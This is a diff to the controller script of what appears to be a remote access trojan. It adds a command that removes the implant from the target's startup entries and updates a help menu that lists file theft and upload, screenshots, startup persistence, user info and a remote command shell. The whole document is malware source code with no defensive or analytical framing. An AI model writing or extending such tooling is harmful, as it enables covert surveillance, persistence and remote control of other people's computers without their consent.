@@ -272,6 +272,15 @@ def startup():
         print(strClientResponse)
 
 
+def remove_from_startup():
+    send(str.encode("rmvstartup"))
+    print("Removing ...")
+
+    strClientResponse = decode_utf8(recv(intBuff))
+    if not strClientResponse == "success":
+        print(strClientResponse)
+
+
 def send_file():
     strFile = remove_quotes(input("\n" + "File to send: "))
     if not os.path.isfile(strFile):
@@ -429,7 +438,8 @@ def show_help():
     print("--r Receive file from the user")
     print("--s Send file to the user")
     print("--p Take screenshot")
-    print("--a Run at startup")
+    print("--a (1) Add to startup")
+    print("--a (2) Remove from startup")
     print("--v View files")
     print("--u User Info")
     print("--e Open remote cmd")
@@ -461,8 +471,10 @@ def send_commands():
             elif strChoice[:3] == "--o" and len(strChoice) > 3:
                 strSite = "site" + strChoice[4:]
                 send(str.encode(strSite))
-            elif strChoice == "--a":
+            elif strChoice == "--a 1":
                 startup()
+            elif strChoice == "--a 2":
+                remove_from_startup()
             elif strChoice == "--u":
                 user_info()
             elif strChoice == "--p":
